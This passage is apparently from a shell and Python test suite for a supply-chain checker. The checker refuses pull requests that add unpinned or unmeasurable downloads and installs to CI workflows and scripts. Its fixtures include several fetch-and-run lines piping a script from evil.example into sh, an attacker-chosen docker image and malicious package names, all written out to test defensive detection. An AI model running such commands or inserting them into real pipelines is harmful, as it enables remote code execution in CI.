check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
now = dt.datetime(2026, 10, 5, tzinfo=dt.timezone.utc)
for v in (">=2.0", "(unpinned)", "latest", "${{expression}}"):
    ok, why, _ = ac.judge_item(inv.Item("package", "pypi/p", v), [("2020-01-01T00:00:00Z", "pypi"), ("2020-01-01T00:00:00Z", "pr-clock")], now)
    assert not ok and "not a pin" in why, (v, why)
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
runck unm1 '{"times": {}}'
CASE="a PR that adds npm install to a workflow is refused (exit 1, unmeasured named), though nothing in the inventory moved"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/unm1.out"; check grep -qi 'not measurable' "$work/unm1.out"
newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
runck unm2 '{"times": {}}'
CASE="the same in a shell script outside .github (tools/fetch.sh) is refused too"
check test "$rc" -eq 1; check grep -q 'unmeasured:tools/fetch.sh' "$work/unm2.out"
newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
git -C "$work/unm3" commit -q --amend -m head
git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"
CASE="an unmeasured form already in the base (count unchanged by the head) is not refused: only an ADDED one is"
rc=0; python3 "$chk" --root "$work/unm3" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/unm3.out" 2>&1 || rc=$?
check test "$rc" -eq 0

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY
rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
python3 - "$work/swap2" <<'PY'
import pathlib, subprocess, sys
root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
g("add", "-A"); g("commit", "-q", "-m", "base2")
f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
g("add", "-A"); g("commit", "-q", "-m", "head")
PY
runck swap2 '{"times": {}}'
CASE="an in-place SWAP of one unmeasured command for another (localhost curl -> evil download) is an addition: refused, though the count did not change"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/swap2.out"
newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
runck cont '{"times": {}}'
CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
check test "$rc" -eq 1; check grep -q 'a download' "$work/cont.out"; check grep -q 'a system package install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
runck scanner '{"times": {}}'
CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
check test "$rc" -eq 1; check grep -q 'unmeasured:bin/install-scanner.sh' "$work/scanner.out"

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("action:local:./tools/act~") and k.endswith("@(local)") for k in got), sorted(got)   # a local action: its name carries a digest of the raw spelling
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY
CASE="a CHANGED download source or a new local action is refused (a placeholder is never a pin)"
newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
runck srcswap '{"times": {}}'
check test "$rc" -eq 1; check grep -q 'not a pin' "$work/srcswap.out"

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
    try:
        fn()
    except RuntimeError as e:
        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
assert time.time() - t < 3, time.time() - t
# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
try:
    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
except RuntimeError:
    pass
else:
    raise AssertionError("an overlong pip install was accepted")
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r/t.tgz@v${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
import importlib.util as u
spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = u.module_from_spec(spec); spec.loader.exec_module(ac)
for k in need:
    ok, why, _ = ac.judge_item(got[k], [("2020-01-01T00:00:00Z", "pr-clock")], __import__("datetime").datetime(2026, 10, 5, tzinfo=__import__("datetime").timezone.utc))
    assert not ok and "not a pin" in why, (k, why)
PY
newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
runck bigagent '{"times": {}}'
CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

CASE="a script's placeholder is identified by its own LINE: an edit elsewhere in the script moves nothing, an edit of that line does"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
base = "echo a\ndocker run --rm $IMG make\necho b\n"
a = set(inv.inventory({"bin/x.sh": base}))
assert a and a == set(inv.inventory({"bin/x.sh": base + "echo more\n"})) == set(inv.inventory({"bin/x.sh": "echo zero\n" + base}))
assert a != set(inv.inventory({"bin/x.sh": base.replace("$IMG", "$OTHER")}))
PY

CASE="round 15: a download keeps its EXACT tag, pip options may precede install and --requirement is a requirements file, *-version-file inputs are placeholders, a placeholder's identity covers the step's and the job's env, the real scanner download syntax is read and the rest of that script is scanned"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run, extra="": {".github/workflows/a.yml": "jobs:\n  j:\n" + extra + "    steps:\n      - run: " + run + "\n"}
g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x.tgz"))
it = [v for v in g.values() if v.name == "o/r"][0]
assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
b = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: evil/image:latest\n        run: docker run --rm \"$IMAGE\" true\n"})
assert [k for k in b if k not in a and "(variable)" in k], "changing the variable's value (env) must change the placeholder's key"
c = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: alpine@sha256:" + "a" * 64 + "\n"))
d = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: evil/x:latest\n"))
assert set(c) != set(d), "a job-level env value changes the identity too"
real = inv.inventory({"bin/install-scanner.sh": 'TRIVY_BASE="${TRIVY_BASE_URL:-https://github.com/aquasecurity/trivy/releases/download}"\ncurl -fsSL https://github.com/evil/evil/releases/download/v1/x.tgz -o x\n'})
assert any(k.startswith("tool:source:") and "aquasecurity/trivy" in k for k in real) and any(v.name == "evil/evil" for v in real.values()), sorted(real)
PY

CASE="round 15 (plain forms): an expression-valued installer input, a container or services image given by an expression, and a matrix or env value feeding them are step-identified placeholders (a change to the value is a changed key); each curl/wget invocation is judged on its own"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def wfi(env, ver="${{ env.LINT_V }}"):
    return {".github/workflows/a.yml": "env:\n  LINT_V: " + env + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + ver + "\n"}
a, b = set(inv.inventory(wfi("v1.61.0"))), set(inv.inventory(wfi("v9.9.9")))
assert a != b and any("golangci-lint@${{expression}}" in k for k in a), (a, b)
def wfm(m):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        py: " + m + "\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version: ${{ matrix.py }}\n"}
assert set(inv.inventory(wfm("['3.12']"))) != set(inv.inventory(wfm("['3.12', '3.13-dev']")))
def wfc(m, svc="postgres:${{ matrix.pg }}"):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        image: " + m + "\n    container: ${{ matrix.image }}\n    services:\n      db:\n        image: " + svc + "\n    steps:\n      - run: echo hi\n"}
c1 = inv.inventory(wfc("['node:20']"))
assert any(k.startswith("image:(expression)@") for k in c1) and len([k for k in c1 if k.startswith("image:(expression)")]) == 2, sorted(c1)
assert set(c1) != set(inv.inventory(wfc("['node:20', 'evil:latest']")))
um = inv.unmeasured({".github/workflows/a.yml": "x: wget https://example.com/a.tgz; curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
assert [k for k in um if k[1] == "a download"], "the non-release wget before a release curl must still be refused"
assert not inv.unmeasured({".github/workflows/a.yml": "x: curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
PY

CASE="round 15 (Codex): the exact download tag is the identity (v1.2.3 and 1.2.3 differ), an encoded-tag URL is refused not excused, requirements.in/-dev/.lock files are refused, an unversioned go install is a placeholder, an unresolved package NAME cannot pass the age judge, installer-input placeholders carry their step identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import datetime, importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
k1 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x")))
k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.3/x.tgz -o x")))
assert k1 != k2
assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
    assert inv.unmeasured(wf(ln)), ln
assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
it = [v for v in inv.inventory(wf('go install "$TOOL@v1.2.3"')).values() if v.kind == "gotool"][0]
ok, why, _ = ac.judge_item(it, [("2020-01-01T00:00:00Z", "pr-clock")], datetime.datetime(2026, 10, 5, tzinfo=datetime.timezone.utc))
assert not ok and "not a pin" in why, why
u = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: " + v + "\n"}
assert set(inv.inventory(u(".python-version"))) != set(inv.inventory(u(".python-version-new")))
PY

CASE="PR clock: a check suite of the introducing commit earlier than any workflow run (a non-Actions check) sets the clock; the observer reads completed runs including a failed one"
out=$(python3 - "$work/map.json" "$INTRO" "$HEADC" <<'PY'
import json, sys
json.dump({"repos/o/r/actions/runs?head_sha=" + sys.argv[2] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-09-20T00:00:00Z"}]},
           "repos/o/r/commits/" + sys.argv[2] + "/check-suites?per_page=100": {"check_suites": [{"created_at": "2026-09-10T00:00:00Z"}, {"created_at": "2026-09-15T00:00:00Z"}]}}, open(sys.argv[1], "w"))
PY
cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$stubpy" "$work/pc" "$BASEC" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[2], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[3], sys.argv[4], "HEAD"))
PY
)
case "$out" in *2026-09-10T00:00:00Z) ok "$CASE";; *) bad "$CASE ($out)";; esac
check python3 - "$here/../supply-chain/tag_observer.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("t", sys.argv[1]); t = importlib.util.module_from_spec(spec); spec.loader.exec_module(t)
ok = {"event": "schedule", "head_branch": "main", "path": ".github/workflows/supply-chain.yml"}
assert t.accept_run(dict(ok, conclusion="success")) and t.accept_run(dict(ok, conclusion="failure")) and not t.accept_run(dict(ok, conclusion="cancelled"))
PY

CASE="a download SOURCE is an item: url=/URL=/*_BASE_URL assignments in a script and *_BASE_URL/*_URL env at any level; retargeting one (an env override, a url template line) is a changed key and is refused"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
sh = lambda ln: {"bin/install-scanner.sh": "TRIVY_VER=0.74.0\n" + ln + "\ncurl -fsSL \"$url\" -o t\n"}
a = set(inv.inventory(sh('url="${TRIVY_BASE}/v${TRIVY_VER}/trivy.tgz"'))); b = set(inv.inventory(sh('url="https://evil.example/t.tgz"')))
assert a != b and [k for k in b if k not in a and "(source)" in k], (a, b)
envwf = lambda v: {".github/workflows/a.yml": "env:\n  TRIVY_BASE_URL: " + v + "\njobs:\n  j:\n    steps:\n      - run: bin/install-scanner.sh trivy\n"}
assert set(inv.inventory(envwf("https://github.com/aquasecurity/trivy/releases/download"))) != set(inv.inventory(envwf("https://evil.example/dl")))
assert [k for k in inv.inventory(envwf("https://x")) if k.startswith("tool:source:env:trivy_base_url=")]
PY

CASE="round 16 (Codex): go install of a variable and pip3.12 install are placeholders/items; a script placeholder's identity includes the assignments of the variables it references; every URL of a downloader segment is classified by host and path; the downloaded asset name is part of the identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
assert [k for k in inv.inventory(wf('go install "$TOOL"')) if "(variable)" in k]
assert inv.inventory(wf("pip3.12 install examplepkg==99.0.0")).get("package:pypi/examplepkg@99.0.0")
a = set(inv.inventory({"bin/x.sh": "TAG=v1.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"})); b = set(inv.inventory({"bin/x.sh": "TAG=v9.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"}))
assert a != b
assert inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz https://downloads.example/new-tool.tar.gz"))
assert inv.unmeasured(wf("curl -fLO https://mirror.example/github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
assert not inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
x = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/old.tgz -o x"))); y = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/new.tgz -o x")))
assert x != y
PY

CASE="an option chain of a thousand tokens before pip/docker is read in milliseconds (no regex backtracking), and docker global options with values (--context x) do not hide the subcommand"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
